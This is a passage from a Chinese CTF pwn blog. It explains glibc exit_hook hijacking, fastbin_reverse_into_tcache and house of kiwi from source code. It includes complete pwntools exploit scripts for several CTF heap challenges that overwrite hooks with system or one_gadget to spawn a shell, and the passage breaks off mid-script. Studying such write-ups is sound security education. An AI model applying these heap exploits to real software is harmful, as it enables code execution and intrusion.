      for (unsigned int cnt = 0; cnt &lt; GLRO(dl_naudit); ++cnt)                        &#123;                            if (afct-&gt;objclose != NULL)                            &#123;                                struct auditstate *state                                    = link_map_audit_state (l, cnt);                                /* Return value is ignored.  */                                (void) afct-&gt;objclose (&amp;state-&gt;cookie);                            &#125;                            afct = afct-&gt;next;                        &#125;                    &#125;                    #endif                &#125;                /* Correct the previous increment.  */                --l-&gt;l_direct_opencount;            &#125;        &#125;    &#125;    #ifdef SHARED    if (! do_audit &amp;&amp; GLRO(dl_naudit) &gt; 0)    &#123;        do_audit = 1;        goto again;    &#125;    if (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_STATISTICS))        _dl_debug_printf (&quot;\\nruntime linker statistics:\\n&quot;                          &quot;           final number of relocations: %lu\\n&quot;                          &quot;final number of relocations from cache: %lu\\n&quot;,                          GL(dl_num_relocations),                          GL(dl_num_cache_relocations));    #endif&#125;\n\n上面就是_dl_fini函数，这次重点关注的是这一段代码\n#ifdef SHAREDint do_audit = 0;again:#endiffor (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)&#123;    /* Protect against concurrent loads and unloads.  */    __rtld_lock_lock_recursive (GL(dl_load_lock));    unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;    /* No need to do anything for empty namespaces or those used for\t auditing DSOs.  */    if (nloaded == 0        #ifdef SHARED        || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit        #endif       )        __rtld_lock_unlock_recursive (GL(dl_load_lock));    ... ...&#125;\n\n下面给出两种函数的定义\n# define __rtld_lock_lock_recursive(NAME) \\  GL(dl_rtld_lock_recursive) (&amp;(NAME).mutex)# define __rtld_lock_unlock_recursive(NAME) \\  GL(dl_rtld_unlock_recursive) (&amp;(NAME).mutex)#  define GL(name) _rtld_global._##name\n\n可以看出来这里是将_rtld_global当中的属性当作函数来进行调用的\n\n然而这俩属性也就是俩指针，所以我们可以修改这个指针到system，接着就是构造参数了。根据上面的调用关系可以看到最后的参数其实是\n\n以上其实就是exit_hook的全部了，很简单。\n新的发现&#123;    ... ...        if (run_list_atexit)            RUN_HOOK (__libc_atexit, ());    _exit (status);&#125;\n\n在上面的__run_exit_handlers 函数当中存在以上代码\n# define RUN_HOOK(NAME, ARGS)\t\t\t\t\t\t      \\do &#123;\t\t\t\t\t\t\t\t\t      \\  void *const *ptr;\t\t\t\t\t\t      \\  for (ptr = (void *const *) symbol_set_first_element (NAME);\t\t      \\       ! symbol_set_end_p (NAME, ptr); ++ptr)\t\t\t\t      \\    (*(__##NAME##_hook_function_t *) *ptr) ARGS;\t\t\t      \\&#125; while (0)\n\n跟进发现是可以循环执行内容的一个函数，所以这里如果可以修改掉__libc_atexit就可以getshell。\n然后实际的做题过程中会发现并没有__libc_atexit这个符号，因为这不是一个全局变量，所以是找不到的，但是通过汇编分析\n\n可以发现是这条语句在调用hook\n\n在最后的实际调用也可以看到确实是这样的，这里的rbx也就是上面的__libc_atexit指针。\n总结以上利用方式在最后总结一下以上两种利用方式，第一种利用方式的攻击层面其实是发生在ld层面的，所以也就存在了一些奇奇怪怪的因素(至少当初写house of banana总是会出现)但是这一种利用方式是可以我们控制其参数的。第二种利用方式就发生在libc层面了，所以我们修改起来也就更加的得心应手一点，不过坏处就是我们没法控制其参数。\n一次awd训练的pwn题目的漏洞很明显，在delete函数存在UAF，并且在edit函数存在堆溢出，不过恶心的是没有show函数并且题目使用的输出函数都是write导致我们没法使用_IO_FILE来进行泄漏，虽然glibc的版本是2.27但是malloc_hook和free_hook初始值都是0没法进行partial write所以这里就需要使用到exit_hook了。\n这里因为漏洞点很简单就不一步一步分析了，就是实现unsored bin和tcache中存在同一使用的chunk，进行partial write达成以下情况\n\n然后利用同样的方法修改掉他的参数也就是_rtld_global._dl_load_lock.mutex 的值为/bin/sh\\x00即可\nexpfrom pwn import *elf = ELF(&quot;./pwn&quot;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, data=b&#x27;\\n&#x27;):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)def delete(idx):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def edit(idx, size, data):    r.recvuntil(b&#x27;Your choice :&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Size: &#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Data: &#x27;)    r.send(data)exit_hook = 0x62af60while 1:    r = process(&#x27;./pwn&#x27;)    try:        # r = process(&#x27;./pwn&#x27;)        create(0x100)        create(0x100)        for i in range(8):            edit(0, 16, flat(0, 0))            delete(0)        create(0x80, b&#x27;\\x60\\xaf\\x82&#x27;)        create(0x100)        create(0x100, b&#x27;\\x20\\xf4\\x24&#x27;)        create(0x110)        create(0x110)        for i in range(8):            edit(5, 16, flat(0, 0))            delete(5)        create(0x90, b&#x27;\\x68\\xa9\\x82&#x27;)        create(0x110)        create(0x110, b&#x27;/bin/sh\\x00&#x27;)        r.recvuntil(b&#x27;Your choice :&#x27;)        # gdb.attach(r)        r.sendline(b&#x27;4&#x27;)        r.interactive()    except:        r.close()\n\n国赛newest_note这道题目其实存在一个非常明显，可惜当时我没有发现的漏洞\ndword_4198 = input_int();chunk_arr = malloc(8 * dword_4198);\n\n也就是在开始的时候可以创建任意大小的chunk，所以可以直接泄露地址，不过即便是没注意到这个漏洞也是可以做题的，不过因为没有接触过exit_hook所以我当时的思路是劫持栈进行ROP，后面发现实现不了。\n在不用mmap生成chunk泄露的情况下在glibc-2.27_ubuntu1.2_amd64之后tcache就存在double free的检测了，结合题目这里是没法直接在tcache当中进行double free的，所以我们只能将double free发生在fastbin当中\n解题思路使用这种方法其实是比较麻烦的，首先将tcache占满，那么下一次释放的chunk会进入fastbin，然后create一个chunk，拿出tcache中的一个chunk，接着再释放一次fastbin当中的chunk，就达到了在tcacheh和fastbin当中存在同一个chunk的情况了，接着伪造fastbin，利用fastbin_reverse_into_tcache将伪造的链放入tcache即可进一步利用了。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(b&#x27;45&#x27;)for i in range(19):    create(i, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)for i in range(8):    delete(i)create(8, b&#x27;\\x00&#x27; * 8 + b&#x27;\\n&#x27;)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;)) &lt;&lt; 12print(&#x27;heap_base=&gt;&#x27;, hex(heap_base))print(hex((heap_base + 0x610) &gt;&gt; 12))key = heap_base &gt;&gt; 12create(18, p64(key ^ (heap_base + 0x560)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x480)))create(19, b&#x27;\\n&#x27;)create(19, b&#x27;\\n&#x27;)create(19, p64(key ^ (heap_base + 0x460)))create(19, b&#x27;a&#x27; * 0x20 + p64(key ^ (heap_base + 0x420)))create(19, b&#x27;a&#x27; * 0x20 + p64(key))create(20, b&#x27;\\n&#x27;)create(21, b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x441))delete(1)show(1)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))&#x27;&#x27;&#x27;0xeeccc execve(&quot;/bin/sh&quot;, r15, r12)constraints:  [r15] == NULL || r15 == NULL  [r12] == NULL || r12 == NULL0xeeccf execve(&quot;/bin/sh&quot;, r15, rdx)constraints:  [r15] == NULL || r15 == NULL  [rdx] == NULL || rdx == NULL0xeecd2 execve(&quot;/bin/sh&quot;, rsi, rdx)constraints:  [rsi] == NULL || rsi == NULL  [rdx] == NULL || rdx == NULL&#x27;&#x27;&#x27;one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(30, b&#x27;a&#x27; * 0x20 + p64(libc_atexit ^ key))create(31, b&#x27;\\n&#x27;)create(32, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n在mmap生成chunk的情况下解题思路在这个情况下其实就更加简单了，因为这里直接泄露了libc地址，所以我们不需要想上面那样构造fake tcache，我们只需要拿到double free即可，这里因为可以直接少用一次free所以我们可以直接在fastbin当中进行double free。\nexpfrom pwn import *elf = ELF(&#x27;./newest_note&#x27;)r = process(&#x27;./newest_note&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def create(idx, content):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content: &#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;4. Exit&#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def ROL(content, key):    tmp = bin(content)[2:].rjust(64, &#x27;0&#x27;)    return int(tmp[key:] + tmp[:key], 2)r.recvuntil(b&#x27;How many pages your notebook will be? :&#x27;)r.sendline(bytes(str(0x40040000), encoding=&#x27;utf-8&#x27;))show(0x8339a)r.recvuntil(b&#x27;Content: &#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x218cc0print(hex(libc_base))for i in range(9):    create(i, b&#x27;\\n&#x27;)for i in range(8):    delete(i)delete(8)delete(7)show(0)r.recvuntil(b&#x27;Content: &#x27;)key = u64(r.recv(5).ljust(8, b&#x27;\\x00&#x27;))print(hex(key))for i in range(7):    create(i, b&#x27;\\n&#x27;)one_gadget = libc_base + 0xeeccclibc_atexit = libc_base + 0x21a6c8 - 8create(7, p64(libc_atexit ^ key))create(8, b&#x27;\\n&#x27;)create(8, b&#x27;\\n&#x27;)create(9, p64(0) + p64(one_gadget))r.recvuntil(b&#x27;4. Exit&#x27;)gdb.attach(    r,    &#x27;b*$rebase(0x169A)\\nb _int_malloc\\ndir /ctf/work/download/glibc-2.34/malloc&#x27;)r.sendline(b&#x27;4&#x27;)r.interactive()\n\n总结这里从源码层面解释了两种exit_hook，并且在例题中两种方式都是使用了，国赛的这道题目是很简单的，我也想到第一种方法了，不过就是因为存在知识点的遗漏导致没做出来，也是在看了wp之后才了解了exit_hook，所以基础知识还是很重要不然思路会受到限制。第一道例题如果有需要可以评论。\n","categories":["pwn"],"tags":["堆利用"]},{"title":"fastbin_reverse_into_tcache","url":"/2022/05/26/fastbin-reverse-into-tcache/","content":"这一利用方式是一种类似于unsorted bin，tcache stashing unlink attack可以在任意地址写入堆地址的漏洞。\n源码分析if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))&#123;    idx = fastbin_index (nb);    mfastbinptr *fb = &amp;fastbin (av, idx);    mchunkptr pp;    victim = *fb;    if (victim != NULL)    &#123;        if (SINGLE_THREAD_P)            *fb = victim-&gt;fd;        else            REMOVE_FB (fb, pp, victim);        if (__glibc_likely (victim != NULL))        &#123;            size_t victim_idx = fastbin_index (chunksize (victim));            if (__builtin_expect (victim_idx != idx, 0))                malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);            check_remalloced_chunk (av, victim, nb);            #if USE_TCACHE            /* While we&#x27;re here, if we see other chunks of the same size,\t\t stash them in the tcache.  */            size_t tc_idx = csize2tidx (nb);            if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)            &#123;                mchunkptr tc_victim;                /* While bin not empty and tcache not full, copy chunks.  */                while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                       &amp;&amp; (tc_victim = *fb) != NULL)                &#123;                    if (SINGLE_THREAD_P)                        *fb = tc_victim-&gt;fd;                    else                    &#123;                        REMOVE_FB (fb, pp, tc_victim);                        if (__glibc_unlikely (tc_victim == NULL))                            break;                    &#125;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;            #endif            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到在源码中，如果tcache不为空，那么就会从fastbin的fd指针指向的chunk开始往tcache内放入chunk。如果我们能够将最后一个堆地址的fd指针改成我们的目标地址即可实现任意地址写了。\ntcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;\n\n这里的写功能还是在放入tcache的函数内完成的，可以看到其实是写了两个指针的。\n\n\n\n最后实现这样\npoc这里的poc是how2heap当中的\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;assert.h&gt;const size_t allocsize = 0x40;int main()&#123;  setbuf(stdout, NULL);  printf(    &quot;\\n&quot;    &quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\\n&quot;    &quot;except it works with a small allocation size (allocsize &lt;= 0x78).\\n&quot;    &quot;The goal is to set things up so that a call to malloc(allocsize) will write\\n&quot;    &quot;a large unsigned value to the stack.\\n\\n&quot;  );  // Allocate 14 times so that we can free later.  char* ptrs[14];  size_t i;  for (i = 0; i &lt; 14; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;First we need to free(allocsize) at least 7 times to fill the tcache.\\n&quot;    &quot;(More than 7 times works fine too.)\\n\\n&quot;  );  // Fill the tcache.  for (i = 0; i &lt; 7; i++) &#123;    free(ptrs[i]);  &#125;  char* victim = ptrs[7];  printf(    &quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\\n&quot;    &quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\\n&quot;    &quot;already full, it will go in the fastbin.\\n\\n&quot;,    victim  );  free(victim);  printf(    &quot;Next we need to free between 1 and 6 more pointers. These will also go\\n&quot;    &quot;in the fastbin. If the stack address that we want to overwrite is not zero\\n&quot;    &quot;then we need to free exactly 6 more pointers, otherwise the attack will\\n&quot;    &quot;cause a segmentation fault. But if the value on the stack is zero then\\n&quot;    &quot;a single free is sufficient.\\n\\n&quot;  );  // Fill the fastbin.  for (i = 8; i &lt; 14; i++) &#123;    free(ptrs[i]);  &#125;  // Create an array on the stack and initialize it with garbage.  size_t stack_var[6];  memset(stack_var, 0xcd, sizeof(stack_var));  printf(    &quot;The stack address that we intend to target: %p\\n&quot;    &quot;It&#x27;s current value is %p\\n&quot;,    &amp;stack_var[2],    (char*)stack_var[2]  );  printf(    &quot;Now we use a vulnerability such as a buffer overflow or a use-after-free\\n&quot;    &quot;to overwrite the next pointer at address %p\\n\\n&quot;,    victim  );  //------------VULNERABILITY-----------  // Overwrite linked list pointer in victim.  *(size_t**)victim = &amp;stack_var[0];  //------------------------------------  printf(    &quot;The next step is to malloc(allocsize) 7 times to empty the tcache.\\n\\n&quot;  );  // Empty tcache.  for (i = 0; i &lt; 7; i++) &#123;    ptrs[i] = malloc(allocsize);  &#125;  printf(    &quot;Let&#x27;s just print the contents of our array on the stack now,\\n&quot;    &quot;to show that it hasn&#x27;t been modified yet.\\n\\n&quot;  );  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  printf(    &quot;\\n&quot;    &quot;The next allocation triggers the stack to be overwritten. The tcache\\n&quot;    &quot;is empty, but the fastbin isn&#x27;t, so the next allocation comes from the\\n&quot;    &quot;fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\\n&quot;    &quot;Those 7 chunks are copied in reverse order into the tcache, so the stack\\n&quot;    &quot;address that we are targeting ends up being the first chunk in the tcache.\\n&quot;    &quot;It contains a pointer to the next chunk in the list, which is why a heap\\n&quot;    &quot;pointer is written to the stack.\\n&quot;    &quot;\\n&quot;    &quot;Earlier we said that the attack will also work if we free fewer than 6\\n&quot;    &quot;extra pointers to the fastbin, but only if the value on the stack is zero.\\n&quot;    &quot;That&#x27;s because the value on the stack is treated as a next pointer in the\\n&quot;    &quot;linked list and it will trigger a crash if it isn&#x27;t a valid pointer or null.\\n&quot;    &quot;\\n&quot;    &quot;The contents of our array on the stack now look like this:\\n\\n&quot;  );  malloc(allocsize);  for (i = 0; i &lt; 6; i++) &#123;    printf(&quot;%p: %p\\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);  &#125;  char *q = malloc(allocsize);  printf(    &quot;\\n&quot;    &quot;Finally, if we malloc one more time then we get the stack address back: %p\\n&quot;,    q  );  assert(q == (char *)&amp;stack_var[2]);  return 0;&#125;\n\n并且在上面poc也说了，如果我们再一次malloc即可获得我们目标地址的chunk，也就是可以进行任意地址分配chunk。\n\n参考链接：https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_reverse_into_tcache.c\n","categories":["pwn"],"tags":["堆利用"]},{"title":"glibc2.32的堆风水+house of kiwi实例","url":"/2022/05/13/glibc2-32%E7%9A%84%E5%A0%86%E9%A3%8E%E6%B0%B4-house-of-kiwi%E5%AE%9E%E4%BE%8B/","content":"看我前面的文章可以发现我在做漏洞利用的总结主要是在glibc2.31以下版本的，这也就导致了在后续版本的glibc的利用方式我也没怎么掌握，后续打算将house of kiwi以及house of Emma写完之后会关注一下glibc2.31之后的how2heap的poc，如果存在差异就会写文章记录。\n在学校的一次比赛当中我出了一道题，是glibc2.23版本的，当时的解题关键就是off by null进行多个堆合并，利用方式较为简单。但是就目前的glibc2.32中consolidate的条件是比较苛刻的，因此出现了新的堆风水的方式了(这篇文章也是把以前的坑填了)。\n隔块堆合并手法首先还是先看源码\nif (!prev_inuse(p)) &#123;    prevsize = prev_size (p);    size += prevsize;    p = chunk_at_offset(p, -((long) prevsize));    if (__glibc_unlikely (chunksize(p) != prevsize))        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);    unlink_chunk (av, p);&#125;\n\nstatic voidunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)    &#123;      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p\t  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)\tmalloc_printerr (&quot;corrupted double-linked list (not small)&quot;);      if (fd-&gt;fd_nextsize == NULL)\t&#123;\t  if (p-&gt;fd_nextsize == p)\t    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;\t  else\t    &#123;\t      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;\t      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;\t      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;\t      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;\t    &#125;\t&#125;      else\t&#123;\t  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;\t  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;\t&#125;    &#125;&#125;\n\n可以看到这里是验证了p位，如果为0那么就检测前一个chunk的size是否等于当前chunk的size，那么就不能单纯的像以前那样利用了，我们还需要伪造前一个chunk的size了，这里需要用到large bin的机制了。\n利用方式既然我们只能进行off by null还需要堆合并，那我们就需要满足上面代码的两项要求，第一就是常规的chunk-&gt;fd-&gt;bk指向本身，其次就是size==prev_size\n\n此时取出size:0x510，由于残留指针，所以还是存在以下的指向关系\n\n并且此时在fd，bk位置伪造prev_size和size，那么我们在下面off by null的时候计算出prev_size即可绕过对于size的检查了。但是此时又出现了一个问题，fake_chunk的fd的bk以及fake_chunk的bk的fd并不指向它本身。那么现在取出size:0x500的chunk，直接覆盖掉其fd指针，使他指向size:0x510，然后large bin当中只剩下一个size:0x520，它的fd和bk都指向了large bin了，所以我们此时需要再free一个size为0x500的chunk，然后把size:0x520取出来进行覆盖，那么即可绕过consolidate时的验证了。\nNULL_FXCK基本流程这道题同样是菜单题，但是不同的是在每次选择的时候会验证__malloc_hook和__free_hook以及会清除掉tcache的count。\n然后唯一的漏洞点是modify函数，存在一个off by null但是只能执行一次。并且在delete函数会清空指针。\n思路因为只有一次off by null的机会，所以我们能够利用的方式就是上面的堆合并技巧，但是这里的create函数在写入数据的时候总是会把结尾改为\\x00并且最小的chunk为0x110所以我们无法直接覆盖内容了，需要利用partial overwrite并且这里的partial overwrite还需要注意一下。我们需要让size:0x510的chunk的地址形式为：0xAAAAAAAAAAAA00AA\n\n形成这样的堆叠，接着申请回来并覆盖值\n\n当然这里由于partial overwrite的缘故第一位是否为0是需要一定概率的(上面的0x1000是因为我还没有计算大小，后续会调整)。\n\n可以看到这里就实现了consolidate。\n下面就是泄漏地址了，首先先泄漏堆地址，因为泄漏起来较为简单，在我们consolidate之前我们所显示的堆地址都是以\\x00结尾导致无法泄漏，但是在consolidate之后存在以下代码\nunlink_chunk (mstate av, mchunkptr p)&#123;  if (chunksize (p) != prev_size (next_chunk (p)))    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);  mchunkptr fd = p-&gt;fd;  mchunkptr bk = p-&gt;bk;  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))    malloc_printerr (&quot;corrupted double-linked list&quot;);  fd-&gt;bk = bk;  bk-&gt;fd = fd;  ... ...\n\n导致堆地址写在了其他索引的chunk当中，所以可以非常轻松的泄漏出来，不过这里的main_arena+96非常恶心，结尾是\\x00有因为是strlen计算大小打印就导致泄漏不出来，但是这里使用的方法可以继续延续在unsorted bin当中的思路进行切割，但是下一步就是申请大chunk将我们consolidate的chunk放到largin bin当中。\n后面也就是实现任意地址写了，首先想到的肯定就是tcache，虽然题目看起来是没有办法对tcache进行攻击的但是tcache这个结构体也只是因为tls结构存放的指针才起的作用，所以我们可以通过large bin attack来修改tls结构当中的指针，然后在堆块中布置好地址，最后修改地址进行fsop。这里采取的方式就是以前写过的house of kiwi不过以前写的比较匆忙也没有加以实践，可能看起来就会晕头晕脑的，所以这里还是从源码层面分析一边接着放出exp应该会好点。\nhouse of kiwi先来说一下为什么不能用house of系列中的其他方式，因为这道题的退出函数是_exit然而其他的要求是exit退出或者正常main退出，所以这里只能寻找其他攻击链。\nstatic void__malloc_assert (const char *assertion, const char *file, unsigned int line,\t\t const char *function)&#123;  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\\n&quot;,\t\t     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,\t\t     file, line,\t\t     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,\t\t     assertion);  fflush (stderr);  abort ();&#125;\n\n当assert触发时会调用这一函数，中间调用了fflush\nint_IO_fflush (FILE *fp)&#123;  if (fp == NULL)    return _IO_flush_all ();  else    &#123;      int result;      CHECK_FILE (fp, EOF);      _IO_acquire_lock (fp);      result = _IO_SYNC (fp) ? EOF : 0;      _IO_release_lock (fp);      return result;    &#125;&#125;\n\n\n通过调试也可以看到调用关系\n\n并且这里是可读可写的，所以后续就好办了。\nexpfrom pwn import *elf = ELF(&#x27;./main&#x27;)libc = ELF(&#x27;./libc-2.32.so&#x27;)# context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(size, content=None):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;(: Size:&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    if content is None:        r.send(b&#x27;\\n&#x27;)    else:        r.send(content)def edit(idx, content):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Content:&#x27;)    r.send(content)def delete(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Index:&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def show(idx):    r.recvuntil(b&#x27;&gt;&gt; &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;Index: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))while 1:    r = process(&#x27;./main&#x27;)    try:        # r = process(&#x27;./main&#x27;)        create(0x2000)        create(0x2000)        create(0xd20)        create(0x500)  #3        create(0x4f0)  #4        create(0x4f0)        create(0x100)        create(0x510)        create(0x100)        create(0x500)        create(0x108)  #10        create(0x4f0)        create(0x100)        delete(7)        create(0x1000)        delete(7)        delete(5)        create(0x1000)        delete(5)        delete(3)        create(0x1000)        delete(3)        create(0x500, flat(0, 0x1c60 + 1))  #3        create(0x4f0, b&#x27;\\x00&#x27; * 8 + b&#x27;\\x10\\n&#x27;)  #5        delete(4)        create(0x1000)        delete(4)        create(0x510, b&#x27;\\x10\\n&#x27;)  #4        create(0x4f0)  #7---4        edit(10, b&#x27;\\x00&#x27; * 0x100 + p64(0x1c60))        delete(11)        show(4)        context.log_level = &#x27;debug&#x27;        heap_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x5a10        print(hex(heap_base))        create(0x4f0)  #11        create(0x2000)  #13        delete(13)        show(7)        libc_base = u64(            r.recvuntil(b&#x27;1. Create&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x1e4280        print(hex(libc_base))        tls_tcache = libc_base + 0x1eb578        _IO_file_jumps_addr = libc_base + 0x1e54c0        _IO_file_jumps_SYNC_addr = _IO_file_jumps_addr + 0x60        fake_tcache = b&#x27;\\x00&#x27; * (0x7C - 0x10)        fake_tcache += p16(1)        fake_tcache += p16(1)        fake_tcache = fake_tcache.ljust(0x270 - 0x10, b&#x27;\\x00&#x27;)        fake_tcache += p64(_IO_file_jumps_SYNC_addr)        fake_tcache += p64(libc_base + 0x1e48c0)        payload = fake_tcache        create(0x4f0, payload)  #13        delete(4)        create(0x2000)        delete(4)        payload = b&#x27;a&#x27; * 0x600 + flat(0, 0x521, libc_base + 0x1e4030, libc_base                                      + 0x1e4030, 0, tls_tcache - 0x20)        create(0x600 + 0x30, payload)        delete(7)        create(0x2000)        delete(7)        create(0x4f0, fake_tcache)        pop_rdi = libc_base + next(libc.search(asm(&#x27;pop rdi\\nret&#x27;)))        pop_rsi = libc_base + next(libc.search(asm(&#x27;pop rsi\\nret&#x27;)))        pop_rdx = libc_base + next(libc.search(asm(&#x27;pop rdx\\nret&#x27;)))        pop_rax = libc_base + next(libc.search(asm(&#x27;pop rax\\nret&#x27;)))        syscall = libc_base + next(libc.search(asm(&#x27;syscall\\nret&#x27;)))        ret = libc_base + next(libc.search(asm(&#x27;ret&#x27;)))        